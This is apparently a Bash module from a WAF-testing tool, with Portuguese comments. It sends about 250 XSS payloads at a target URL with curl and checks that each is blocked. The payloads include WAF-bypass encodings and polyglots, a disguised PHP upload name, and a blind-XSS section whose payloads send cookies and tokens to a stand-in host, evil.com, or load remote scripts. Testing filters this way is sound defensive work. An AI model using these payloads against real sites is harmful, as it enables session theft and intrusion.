#!/bin/bash
#==============================================================================
# XSS Tester - Script especializado em testes de XSS
# Versão: 1.0.0
# Descrição: Script modular para testes de XSS usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
XSS_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
XSS_PAYLOADS_DIR="${XSS_SCRIPT_DIR}/PayloadsAllTheThings/XSS Injection"
XSS_INTRUDERS_DIR="${XSS_PAYLOADS_DIR}/Intruders"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

xss_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

xss_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES XSS BÁSICOS - Payloads mais comuns
#==============================================================================
test_xss_basic() {
    xss_print_subsection "XSS Básico (20 variações)"
    
    # Payloads básicos mais efetivos
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
    test_curl "XSS: <script>alert(document.domain)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(document.domain)</script>"
    test_curl "XSS: <script>alert(String.fromCharCode(88,83,83))</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(String.fromCharCode(88,83,83))</script>"
    test_curl "XSS: <scr<script>ipt>alert(1)</scr</script>ipt>" "block" -A "$UA" -Lk "${URL}?q=<scr<script>ipt>alert(1)</scr</script>ipt>"
    test_curl "XSS: \"><script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=\"><script>alert(1)</script>"
    test_curl "XSS: <script>\\u0061lert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>\\u0061lert(1)</script>"
    test_curl "XSS: <script>eval('\\x61lert(\\'1\\')')</script>" "block" -A "$UA" -Lk "${URL}?q=<script>eval('\\x61lert(\\'1\\')')</script>"
    test_curl "XSS: <script>eval(8680439..toString(30))(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>eval(8680439..toString(30))(1)</script>"
    test_curl "XSS: <script>debugger;</script>" "block" -A "$UA" -Lk "${URL}?q=<script>debugger;</script>"
    test_curl "XSS: <script>console.log(document.domain)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>console.log(document.domain)</script>"
    
    # IMG payloads
    test_curl "XSS: <img src=x onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)>"
    test_curl "XSS: <img src=x onerror=alert(1)//" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(1)//"
    test_curl "XSS: <img src=x onerror=alert(String.fromCharCode(88,83,83))>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onerror=alert(String.fromCharCode(88,83,83))>"
    test_curl "XSS: <img src=x oneonerrorrror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20oneonerrorrror=alert(1)>"
    test_curl "XSS: <img src=x:alert(alt) onerror=eval(src) alt=xss>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss>"
    
    # SVG payloads
    test_curl "XSS: <svg onload=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)>"
    test_curl "XSS: <svg/onload=alert('XSS')>" "block" -A "$UA" -Lk "${URL}?q=<svg/onload=alert('XSS')>"
    test_curl "XSS: <svg onload=alert(1)//" "block" -A "$UA" -Lk "${URL}?q=<svg%20onload=alert(1)//"
    test_curl "XSS: <svg/onload=alert(String.fromCharCode(88,83,83))>" "block" -A "$UA" -Lk "${URL}?q=<svg/onload=alert(String.fromCharCode(88,83,83))>"
    test_curl "XSS: <svg id=alert(1) onload=eval(id)>" "block" -A "$UA" -Lk "${URL}?q=<svg%20id=alert(1)%20onload=eval(id)>"
}

#==============================================================================
# TESTES XSS HTML5 - Tags e eventos HTML5
#==============================================================================
test_xss_html5() {
    xss_print_subsection "XSS HTML5 Tags (25 variações)"
    
    test_curl "XSS: <body onload=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<body%20onload=alert(1)>"
    test_curl "XSS: <input autofocus onfocus=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<input%20autofocus%20onfocus=alert(1)>"
    test_curl "XSS: <select autofocus onfocus=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<select%20autofocus%20onfocus=alert(1)>"
    test_curl "XSS: <textarea autofocus onfocus=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<textarea%20autofocus%20onfocus=alert(1)>"
    test_curl "XSS: <keygen autofocus onfocus=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<keygen%20autofocus%20onfocus=alert(1)>"
    test_curl "XSS: <video/poster/onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<video/poster/onerror=alert(1)>"
    test_curl "XSS: <video><source onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<video><source%20onerror=alert(1)>"
    test_curl "XSS: <video src=_ onloadstart=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<video%20src=_%20onloadstart=alert(1)>"
    test_curl "XSS: <details/open/ontoggle=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<details/open/ontoggle=alert(1)>"
    test_curl "XSS: <audio src onloadstart=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<audio%20src%20onloadstart=alert(1)>"
    test_curl "XSS: <marquee onstart=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<marquee%20onstart=alert(1)>"
    test_curl "XSS: <meter value=2 onmouseover=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<meter%20value=2%20onmouseover=alert(1)>"
    test_curl "XSS: <body ontouchstart=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<body%20ontouchstart=alert(1)>"
    test_curl "XSS: <body ontouchend=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<body%20ontouchend=alert(1)>"
    test_curl "XSS: <body ontouchmove=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<body%20ontouchmove=alert(1)>"
    test_curl "XSS: <iframe src=javascript:alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<iframe%20src=javascript:alert(1)>"
    test_curl "XSS: <object data=javascript:alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<object%20data=javascript:alert(1)>"
    test_curl "XSS: <embed src=javascript:alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<embed%20src=javascript:alert(1)>"
    test_curl "XSS: <a href=javascript:alert(1)>click</a>" "block" -A "$UA" -Lk "${URL}?q=<a%20href=javascript:alert(1)>click</a>"
    test_curl "XSS: <form action=javascript:alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<form%20action=javascript:alert(1)>"
    test_curl "XSS: <button onclick=alert(1)>click</button>" "block" -A "$UA" -Lk "${URL}?q=<button%20onclick=alert(1)>click</button>"
    test_curl "XSS: <base href=javascript:alert(1)//>" "block" -A "$UA" -Lk "${URL}?q=<base%20href=javascript:alert(1)//>"
    test_curl "XSS: <div onpointerover=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<div%20onpointerover=alert(1)>"
    test_curl "XSS: <div onpointerdown=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<div%20onpointerdown=alert(1)>"
    test_curl "XSS: <div onpointerup=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<div%20onpointerup=alert(1)>"
}

#==============================================================================
# TESTES XSS WRAPPERS - javascript:, data:, vbscript:
#==============================================================================
test_xss_wrappers() {
    xss_print_subsection "XSS Wrappers (15 variações)"
    
    # javascript: wrapper
    test_curl "XSS: javascript:alert(1)" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
    test_curl "XSS: javascript:prompt(1)" "block" -A "$UA" -Lk "${URL}?url=javascript:prompt(1)"
    test_curl "XSS: javascript:confirm(1)" "block" -A "$UA" -Lk "${URL}?url=javascript:confirm(1)"
    test_curl "XSS: java%0ascript:alert(1)" "block" -A "$UA" -Lk "${URL}?url=java%0ascript:alert(1)"
    test_curl "XSS: java%09script:alert(1)" "block" -A "$UA" -Lk "${URL}?url=java%09script:alert(1)"
    test_curl "XSS: java%0dscript:alert(1)" "block" -A "$UA" -Lk "${URL}?url=java%0dscript:alert(1)"
    test_curl "XSS: javascript://%0Aalert(1)" "block" -A "$UA" -Lk "${URL}?url=javascript://%0Aalert(1)"
    
    # data: wrapper
    test_curl "XSS: data:text/html,<script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?url=data:text/html,<script>alert(1)</script>"
    test_curl "XSS: data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" "block" -A "$UA" -Lk "${URL}?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    test_curl "XSS: data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+" "block" -A "$UA" -Lk "${URL}?url=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+"
    
    # vbscript: wrapper (IE only, but still test)
    test_curl "XSS: vbscript:msgbox(1)" "block" -A "$UA" -Lk "${URL}?url=vbscript:msgbox(1)"
    
    # blob: and other exotic wrappers
    test_curl "XSS: blob:javascript:alert(1)" "block" -A "$UA" -Lk "${URL}?url=blob:javascript:alert(1)"
    
    # URL encoded variants
    test_curl "XSS: %6A%61%76%61%73%63%72%69%70%74%3Aalert(1)" "block" -A "$UA" -Lk "${URL}?url=%6A%61%76%61%73%63%72%69%70%74%3Aalert(1)"
    test_curl "XSS: \\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)" "block" -A "$UA" -Lk "${URL}?url=\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)"
    test_curl "XSS: \\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)" "block" -A "$UA" -Lk "${URL}?url=\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)"
}

#==============================================================================
# TESTES XSS POLYGLOTS - Payloads que funcionam em múltiplos contextos
#==============================================================================
test_xss_polyglots() {
    xss_print_subsection "XSS Polyglots (10 variações)"
    
    # Polyglots famosos
    test_curl "XSS Polyglot: jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//" "block" -A "$UA" -Lk "${URL}?q=jaVasCript:/*-/*\\\`/*\\\\\\\`/*'/*\\\"/**/(/*%20*/onerror=alert('XSS')%20)//"
    test_curl "XSS Polyglot: -->\"></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>" "block" -A "$UA" -Lk "${URL}?q=--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//>"
    test_curl "XSS Polyglot: '\"><img src=x onerror=alert(1)>//" "block" -A "$UA" -Lk "${URL}?q='\\\"<img%20src=x%20onerror=alert(1)>//"
    test_curl "XSS Polyglot: javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>" "block" -A "$UA" -Lk "${URL}?q=javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//>"
    
    # Polyglots from XSS_Polyglots.txt concepts
    test_curl "XSS Polyglot: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->" "block" -A "$UA" -Lk "${URL}?q=';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\\\";"
    test_curl "XSS Polyglot: </script><script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=</script><script>alert(1)</script>"
    test_curl "XSS Polyglot: <svg><script>alert(1)</script></svg>" "block" -A "$UA" -Lk "${URL}?q=<svg><script>alert(1)</script></svg>"
    test_curl "XSS Polyglot: <math><script>alert(1)</script></math>" "block" -A "$UA" -Lk "${URL}?q=<math><script>alert(1)</script></math>"
    test_curl "XSS Polyglot: <table background=javascript:alert(1)></table>" "block" -A "$UA" -Lk "${URL}?q=<table%20background=javascript:alert(1)></table>"
    test_curl "XSS Polyglot: <!--<script>alert(1)</script>-->" "block" -A "$UA" -Lk "${URL}?q=<!--<script>alert(1)</script>-->"
}

#==============================================================================
# TESTES XSS BYPASS WAF - Técnicas de evasão
#==============================================================================
test_xss_waf_bypass() {
    xss_print_subsection "XSS WAF Bypass (30 variações)"
    
    # Case manipulation
    test_curl "XSS Bypass: <ScRiPt>alert(1)</sCrIpT>" "block" -A "$UA" -Lk "${URL}?q=<ScRiPt>alert(1)</sCrIpT>"
    test_curl "XSS Bypass: <SCRIPT>alert(1)</SCRIPT>" "block" -A "$UA" -Lk "${URL}?q=<SCRIPT>alert(1)</SCRIPT>"
    test_curl "XSS Bypass: <sCrIpT>alert(1)</ScRiPt>" "block" -A "$UA" -Lk "${URL}?q=<sCrIpT>alert(1)</ScRiPt>"
    
    # Null bytes
    test_curl "XSS Bypass: <script%00>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script%00>alert(1)</script>"
    test_curl "XSS Bypass: <scri%00pt>alert(1)</scri%00pt>" "block" -A "$UA" -Lk "${URL}?q=<scri%00pt>alert(1)</scri%00pt>"
    
    # URL encoding
    test_curl "XSS Bypass: %3Cscript%3Ealert(1)%3C/script%3E" "block" -A "$UA" -Lk "${URL}?q=%3Cscript%3Ealert(1)%3C/script%3E"
    test_curl "XSS Bypass: %3Cimg%20src=x%20onerror=alert(1)%3E" "block" -A "$UA" -Lk "${URL}?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
    
    # Double URL encoding
    test_curl "XSS Bypass: %253Cscript%253Ealert(1)%253C/script%253E" "block" -A "$UA" -Lk "${URL}?q=%253Cscript%253Ealert(1)%253C/script%253E"
    
    # HTML entities
    test_curl "XSS Bypass: &lt;script&gt;alert(1)&lt;/script&gt;" "block" -A "$UA" -Lk "${URL}?q=&lt;script&gt;alert(1)&lt;/script&gt;"
    test_curl "XSS Bypass: &#60;script&#62;alert(1)&#60;/script&#62;" "block" -A "$UA" -Lk "${URL}?q=&#60;script&#62;alert(1)&#60;/script&#62;"
    test_curl "XSS Bypass: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;" "block" -A "$UA" -Lk "${URL}?q=&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
    
    # Unicode bypass
    test_curl "XSS Bypass: ＜script＞alert(1)＜/script＞" "block" -A "$UA" -Lk "${URL}?q=＜script＞alert(1)＜/script＞"
    test_curl "XSS Bypass: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e" "block" -A "$UA" -Lk "${URL}?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    
    # Tab/newline injection
    test_curl "XSS Bypass: <script%09>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script%09>alert(1)</script>"
    test_curl "XSS Bypass: <script%0a>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script%0a>alert(1)</script>"
    test_curl "XSS Bypass: <script%0d>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script%0d>alert(1)</script>"
    test_curl "XSS Bypass: <img%09src=x%09onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%09src=x%09onerror=alert(1)>"
    
    # Comments bypass
    test_curl "XSS Bypass: <scr<!---->ipt>alert(1)</scr<!---->ipt>" "block" -A "$UA" -Lk "${URL}?q=<scr<!---->ipt>alert(1)</scr<!---->ipt>"
    test_curl "XSS Bypass: <scr/**/ipt>alert(1)</scr/**/ipt>" "block" -A "$UA" -Lk "${URL}?q=<scr/**/ipt>alert(1)</scr/**/ipt>"
    
    # Attribute breaking
    test_curl "XSS Bypass: <img src='x'onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src='x'onerror=alert(1)>"
    test_curl "XSS Bypass: <img src=\"x\"onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=\\\"x\\\"onerror=alert(1)>"
    test_curl "XSS Bypass: <img/src=x/onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img/src=x/onerror=alert(1)>"
    test_curl "XSS Bypass: <img//src=x//onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img//src=x//onerror=alert(1)>"
    
    # SVG bypass tricks
    test_curl "XSS Bypass: <svg><script>alert(1)</script></svg>" "block" -A "$UA" -Lk "${URL}?q=<svg><script>alert(1)</script></svg>"
    test_curl "XSS Bypass: <svg><script/xlink:href=data:,alert(1) />" "block" -A "$UA" -Lk "${URL}?q=<svg><script/xlink:href=data:,alert(1)%20/>"
    test_curl "XSS Bypass: <svg><script href=data:,alert(1) />" "block" -A "$UA" -Lk "${URL}?q=<svg><script%20href=data:,alert(1)%20/>"
    
    # Alternative event handlers
    test_curl "XSS Bypass: <img src=x onError=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20onError=alert(1)>"
    test_curl "XSS Bypass: <img src=x ONERROR=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20ONERROR=alert(1)>"
    test_curl "XSS Bypass: <img src=x oNeRrOr=alert(1)>" "block" -A "$UA" -Lk "${URL}?q=<img%20src=x%20oNeRrOr=alert(1)>"
    
    # Exotic characters
    test_curl "XSS Bypass: <img/src=x/onerror=\`alert(1)\`>" "block" -A "$UA" -Lk "${URL}?q=<img/src=x/onerror=\\\`alert(1)\\\`>"
}

#==============================================================================
# TESTES XSS DOM BASED - DOM XSS específicos
#==============================================================================
test_xss_dom_based() {
    xss_print_subsection "XSS DOM Based (15 variações)"
    
    test_curl "DOM XSS: #<img src=/ onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}#<img%20src=/%20onerror=alert(1)>"
    test_curl "DOM XSS: #<script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}#<script>alert(1)</script>"
    test_curl "DOM XSS: #<svg onload=alert(1)>" "block" -A "$UA" -Lk "${URL}#<svg%20onload=alert(1)>"
    test_curl "DOM XSS: #\"><img src=x onerror=alert(1)>" "block" -A "$UA" -Lk "${URL}#\"><img%20src=x%20onerror=alert(1)>"
    
    # JavaScript context
    test_curl "DOM XSS: ';alert(1)//" "block" -A "$UA" -Lk "${URL}?q=';alert(1)//"
    test_curl "DOM XSS: \";alert(1)//" "block" -A "$UA" -Lk "${URL}?q=\";alert(1)//"
    test_curl "DOM XSS: -(confirm)(1)//" "block" -A "$UA" -Lk "${URL}?q=-(confirm)(1)//"
    test_curl "DOM XSS: ;alert(1);//" "block" -A "$UA" -Lk "${URL}?q=;alert(1);//"
    test_curl "DOM XSS: </script><script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=</script><script>alert(1)</script>"
    
    # Hidden input XSS
    test_curl "DOM XSS: Hidden Input CTRL+SHIFT+X" "block" -A "$UA" -Lk "${URL}?q=<input%20type=hidden%20accesskey=X%20onclick=alert(1)>"
    test_curl "DOM XSS: Hidden Input visibility" "block" -A "$UA" -Lk "${URL}?q=<input%20type=hidden%20oncontentvisibilityautostatechange=alert(1)%20style=content-visibility:auto>"
    
    # Mutated XSS
    test_curl "DOM XSS: Mutated noscript" "block" -A "$UA" -Lk "${URL}?q=<noscript><p%20title=</noscript><img%20src=x%20onerror=alert(1)>>"
    
    # Upper output XSS
    test_curl "DOM XSS: Uppercase output" "block" -A "$UA" -Lk "${URL}?q=<IMG%20SRC=1%20ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>"
    
    # Fragment-based
    test_curl "DOM XSS: Fragment injection" "block" -A "$UA" -Lk "${URL}#x'\"><svg/onload=alert(1)>"
    test_curl "DOM XSS: Location.hash inject" "block" -A "$UA" -Lk "${URL}#javascript:alert(1)"
}

#==============================================================================
# TESTES XSS EM FILES - SVG, XML, Markdown, CSS
#==============================================================================
test_xss_in_files() {
    xss_print_subsection "XSS em Files (SVG, XML, Markdown, CSS) - 15 variações"
    
    # SVG payloads
    test_curl "XSS SVG: onload attribute" "block" -A "$UA" -Lk "${URL}?q=<svg%20xmlns=http://www.w3.org/2000/svg%20onload=alert(1)/>"
    test_curl "XSS SVG: desc script" "block" -A "$UA" -Lk "${URL}?q=<svg><desc><script>alert(1)</script></desc></svg>"
    test_curl "XSS SVG: foreignObject" "block" -A "$UA" -Lk "${URL}?q=<svg><foreignObject><script>alert(1)</script></foreignObject></svg>"
    test_curl "XSS SVG: title script" "block" -A "$UA" -Lk "${URL}?q=<svg><title><script>alert(1)</script></title></svg>"
    test_curl "XSS SVG: animatetransform" "block" -A "$UA" -Lk "${URL}?q=<svg><animatetransform%20onbegin=alert(1)></animatetransform></svg>"
    
    # XML payloads
    test_curl "XSS XML: CDATA escape" "block" -A "$UA" -Lk "${URL}?q=<name><value><![CDATA[<script>alert(1)</script>]]></value></name>"
    test_curl "XSS XML: namespace script" "block" -A "$UA" -Lk "${URL}?q=<html><body><something:script%20xmlns:something=http://www.w3.org/1999/xhtml>alert(1)</something:script></body></html>"
    
    # Markdown XSS
    test_curl "XSS Markdown: javascript link" "block" -A "$UA" -Lk "${URL}?q=[a](javascript:alert(1))"
    test_curl "XSS Markdown: data URI" "block" -A "$UA" -Lk "${URL}?q=[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
    test_curl "XSS Markdown: window.onerror" "block" -A "$UA" -Lk "${URL}?q=[a](javascript:window.onerror=alert;throw%201)"
    
    # CSS XSS
    test_curl "XSS CSS: background-image" "block" -A "$UA" -Lk "${URL}?q=<style>div{background-image:url(\"data:image/jpg;base64,</style><svg/onload=alert(1)>\")}</style>"
    test_curl "XSS CSS: @import" "block" -A "$UA" -Lk "${URL}?q=<style>@import'javascript:alert(1)';</style>"
    
    # PostMessage XSS
    test_curl "XSS PostMessage: wildcard origin" "block" -A "$UA" -Lk "${URL}?q=<script>window.postMessage({sender:'test',url:'javascript:alert(1)'},'*')</script>"
    
    # File upload XSS contexts
    test_curl "XSS Upload: PHP file disguised" "block" -A "$UA" -Lk "${URL}?file=shell.php%00.jpg"
    test_curl "XSS Upload: SVG file upload" "block" -A "$UA" -Lk "${URL}?file=xss.svg"
}

#==============================================================================
# TESTES XSS ADVANCED - Payloads avançados de listas
#==============================================================================
test_xss_from_intruders() {
    xss_print_subsection "XSS Payloads Avançados (50 da lista Intruders)"
    
    local intruders_file="${XSS_INTRUDERS_DIR}/JHADDIX_XSS.txt"
    
    if [ ! -f "$intruders_file" ]; then
        echo -e "${YELLOW}  ⚠ Arquivo de payloads não encontrado: $intruders_file${NC}"
        return
    fi
    
    local count=0
    while IFS= read -r payload || [ -n "$payload" ]; do
        [ -z "$payload" ] && continue
        [ "${payload:0:1}" == "#" ] && continue
        
        count=$((count + 1))
        
        # URL encode o payload
        local encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
        test_curl "XSS Advanced #$count: ${payload:0:40}..." "block" -A "$UA" -Lk "${URL}?q=${encoded_payload}"
        
        [ $count -ge 50 ] && break
    done < "$intruders_file"
    
    echo -e "\n  ${CYAN}Total de payloads XSS avançados testados: $count${NC}"
}

#==============================================================================
# TESTES XSS BLIND - Payloads para Blind XSS
#==============================================================================
test_xss_blind() {
    xss_print_subsection "Blind XSS (10 variações)"
    
    local callback_domain="evil.com"
    
    test_curl "Blind XSS: Cookie stealer" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://${callback_domain}/?c='+document.cookie</script>"
    test_curl "Blind XSS: localStorage stealer" "block" -A "$UA" -Lk "${URL}?q=<script>document.location='http://${callback_domain}/?t='+localStorage.getItem('token')</script>"
    test_curl "Blind XSS: Image beacon" "block" -A "$UA" -Lk "${URL}?q=<script>new%20Image().src='http://${callback_domain}/?c='+document.cookie</script>"
    test_curl "Blind XSS: Fetch POST" "block" -A "$UA" -Lk "${URL}?q=<script>fetch('http://${callback_domain}',{method:'POST',body:document.cookie})</script>"
    test_curl "Blind XSS: XSS Hunter style" "block" -A "$UA" -Lk "${URL}?q=\"><script%20src=https://xss.ht/test></script>"
    test_curl "Blind XSS: jQuery getScript" "block" -A "$UA" -Lk "${URL}?q=<script>\$.getScript('http://${callback_domain}/x.js')</script>"
    test_curl "Blind XSS: Contact form" "block" -A "$UA" -Lk "${URL}?name=<script>alert(document.domain)</script>"
    test_curl "Blind XSS: Referer header" "block" -A "$UA" -Lk -e "http://<script>alert(1)</script>.com" "${URL}"
    test_curl "Blind XSS: User-Agent" "block" -Lk -A "<script>alert(1)</script>" "${URL}"
    test_curl "Blind XSS: Cookie header" "block" -A "$UA" -Lk --cookie "session=<script>alert(1)</script>" "${URL}"
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes XSS
#==============================================================================
run_all_xss_tests() {
    xss_print_section "🎯 TESTES COMPLETOS DE XSS (PayloadsAllTheThings)" "-c xss"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/XSS Injection${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 250+ testes de XSS${NC}"
    echo ""
    
    test_xss_basic
    test_xss_html5
    test_xss_wrappers
    test_xss_polyglots
    test_xss_waf_bypass
    test_xss_dom_based
    test_xss_in_files
    test_xss_from_intruders
    test_xss_blind
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes XSS foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c xss${NC}"
    exit 1
fi
